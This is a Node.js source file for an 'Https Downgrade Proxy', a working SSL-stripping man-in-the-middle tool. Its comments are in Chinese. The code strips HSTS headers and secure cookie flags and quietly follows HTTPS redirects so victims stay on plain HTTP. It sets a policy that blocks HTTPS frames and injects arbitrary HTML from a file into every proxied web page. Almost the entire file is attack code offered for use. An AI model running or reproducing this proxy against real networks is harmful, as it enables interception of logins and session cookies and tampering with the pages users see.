/**
 * Https Downgrade Proxy
 *   @version 0.0.2
 *   @author EtherDream
 */
'use strict';

var $http = require('http'),
    $https = require('https'),
    $zlib = require('zlib'),
    $url = require('url'),
    $fs = require('fs');

var CSP_BLOCK_HTTPS = "default-src * data 'unsafe-inline' 'unsafe-eval'; frame-src http://*";


init(8080);

function init(port) {
    var svr = $http.createServer(onRequest);

    svr.listen(port, function() {
        console.log('running...');
    });

    svr.on('error', function() {
        console.error('listen fail');
    });
}

function fail(res) {
    res.writeHead(404);
    res.end();
}

/**
 * 客户端发起请求
 */
var UA_SYMBOL = ' HiJack';
var R_URL = /^http:\/\/[^/]*(.*)/i;

function onRequest(req, res) {
    var headers = req.headers;

    // 检验 host 字段
    var host = headers.host;
    if (!host) {
        return fail(res);
    }

    // 防止循环代理
    var ua = headers['user-agent'];
    if (!ua || ua.indexOf(UA_SYMBOL) >= 0) {
        return fail(res);
    }
    headers['user-agent'] = ua + UA_SYMBOL;

    // GET 绝对路径（正向代理）
    var m = req.url.match(R_URL);
    if (m) {
        // 取相对路径
        req.url = m[1];
    }

    // 是否为向下转型的 https 请求
    var useSSL;
    if (isFakeUrl(req.url)) {
        req.url = restoreFakeUrl(req.url);
        useSSL = true;
    }

    // 安全页面引用的资源，基本都是 https 的
    var refer = headers['referer'];
    if (refer && isFakeUrl(refer)) {
        headers['referer'] = restoreFakeUrl(req.url);
        useSSL = true;
    }

    // 代理转发
    forward(req, res, useSSL);
}

/**
 * 发起代理请求
 */
function forward(req, res, ssl) {
    var host = req.headers.host;
    var site = host;
    var port = ssl? 443 : 80;

    // 目标端口
    var p = host.indexOf(':');
    if (p != -1) {
        site = host.substr(0, p);
        port = +host.substr(p + 1);
        if (!port) {
            return fail(res);
        }
    }

    // 请求参数
    var options = {
        method: req.method,
        host: site,
        port: port,
        path: req.url,
        headers: req.headers
    };

    // 代理请求
    var fnRequest = ssl? $https.request : $http.request;

    var midReq = fnRequest(options, function(serverRes) {
        handleResponse(req, res, serverRes);
    });

    midReq.on('error', function(err) {
        // 如果 https 请求失败，尝试 http 版本的
        if (ssl) {
            forward(req, res, false);
        }
    });

    //
    // NodeJS 把 头部字段名 全都转为小写了，
    // 一些网站（例如 QQ 空间）无法登录。
    // 我们至少保证 `Host` 仍有大小写
    //
    midReq.setHeader('Host', host);


    if (req._data) {
        // 重定向 https 的请求
        midReq.end(req._data);
    }
    else {
        // 转发上传流量，同时做一备份
        req.pipe(midReq);

        var uploadChunks = [];
        var uploadBytes = 0;

        req.on('data', function(chunk) {
            uploadChunks.push(chunk);
            uploadBytes += chunk.length;
        });

        req.on('end', function() {
            req._data = Buffer.concat(uploadChunks, uploadBytes);
        });
    }
}

/**
 * 处理响应数据
 */
var R_GZIP = /gzip/i,
    R_DEFLATE = /deflate/i;

function handleResponse(clientReq, clientRes, serverRes) {
    var svrHeader = serverRes.headers;
    var usrHeader = clientReq.headers;

    // SSL 相关检测
    if (sslCheck(clientReq, clientRes, serverRes) == 'redir') {
         // 代理 https 重定向
        return forward(clientReq, clientRes, true); 
    }


    // 非网页资源：直接转发
    var mime = svrHeader['content-type'] || '';
    var pos = mime.indexOf(';');
    if (pos >= 0) {
        mime = mime.substr(0, pos);
    }
    if (mime != 'text/html') {
        clientRes.writeHead(serverRes.statusCode, svrHeader);
        serverRes.pipe(clientRes);
        return;
    }


    // 数据流压缩
    var istream, ostream,
        svrEnc = svrHeader['content-encoding'],
        usrEnc = usrHeader['accept-encoding'];

    if (svrEnc) {                             // 网页被压缩？
        if (R_GZIP.test(svrEnc)) {            // - GZIP 算法
            istream = $zlib.createGunzip();

            if (R_GZIP.test(usrEnc)) {
                ostream = $zlib.createGzip();
            }
        }
        else if (R_DEFLATE.test(svrEnc)) {    // - DEFALTE 算法
            istream = $zlib.createInflateRaw();

            if (R_DEFLATE.test(usrEnc)) {
                ostream = $zlib.createDeflateRaw();
            }
        }
    }
    delete svrHeader['content-length'];

    //
    // 输入流（服务端接收流 -> 解压流）
    //   -> 处理 ->
    // 输出流（压缩流 -> 客户端发送流）
    //
    if (istream) {
        serverRes.pipe(istream);
    }
    else {
        istream = serverRes;
    }

    if (ostream) {
        ostream.pipe(clientRes);
    }
    else {
        ostream = clientRes;
        delete svrHeader['content-encoding'];
    }

    // 利用 CSP 策略，阻止访问 https 框架页
    svrHeader["content-security-policy"] = CSP_BLOCK_HTTPS;

    // 返回响应头
    clientRes.writeHead(serverRes.statusCode, svrHeader);

    // 处理数据流注入
    processInject(istream, ostream);
}


// -------------------- injector --------------------

// 注入的 HTML
var mInjectHtml = $fs.readFileSync('inject.html');

// 注入位置
var INJECT_TAG = /^<head/i;
var N = 5;

/**
 * 搜索 chunk 中的可注入点
 * 返回注入点位置，没有则返回 -1
 */
function findInjectPos(chunk) {
    for(var i = N, n = chunk.length; i < n; i++) {
        // 搜索 '>'
        if (chunk[i] != 62) continue;

        // 获取前面的 N 个字符
        var tag = chunk.toString('utf8', i - N, i);

        // 是不是想要注入的位置？
        if (INJECT_TAG.test(tag)) {
            return i + 1;
        }
    }
    return -1;
}

function processInject(istream, ostream) {

    function onData(chunk) {
        var pos = findInjectPos(chunk);
        if (pos >= 0) {
            var begin = chunk.slice(0, pos);
            var tail = chunk.slice(pos, chunk.length);

            ostream.write(begin);           // 前面部分
            ostream.write(mInjectHtml);     // 注入的内容
            ostream.write(tail);            // 后面部分

            istream.pipe(ostream);          // 之后的数据交给底层来转发
            istream.removeListener('data', onData);
            istream.removeListener('end', onEnd);
        }
        else {
            ostream.write(chunk);
        }
    }

    function onEnd() {
        ostream.end();
    }

    istream.on('data', onData);
    istream.on('end', onEnd);
}



// -------------------- sslproxy --------------------
var FAKE_SYMBOL = /[?&]zh_cn$/;
var mFakeSet = {};

function isFakeUrl(url) {
    return (url in mFakeSet) || FAKE_SYMBOL.test(url);
}

function restoreFakeUrl(url) {
    return url.replace(FAKE_SYMBOL, '');
}

function addFakeUrl(url) {
    mFakeSet[url] = true;
}

function sslCheck(clientReq, clientRes, serverRes) {
    var svrHeader = serverRes.headers;

    // 删除 HSTS
    delete svrHeader['strict-transport-security'];

    // 删除 secure cookie
    var cookies = svrHeader['set-cookie'];
    if (cookies) {
        for(var i = cookies.length - 1; i >= 0; i--) {
            cookies[i] = cookies[i].replace(/;\s*secure/, '');
        }
    }

    // 是否重定向到 HTTPS
    var statusCode = serverRes.statusCode;
    if (statusCode != 304 && 300 < statusCode && statusCode < 400) {

        var redir = svrHeader['location'];
        if (redir && /^https:/i.test(redir)) {
            console.warn('[!] redir to:', redir);

            var parser = $url.parse(redir);
            clientReq.url = parser.path;
            clientReq.headers['host'] = parser.host;

            // 记录该地址为 https 资源
            addFakeUrl('http://' + parser.host + parser.path);
            return 'redir';
        }
    }
}
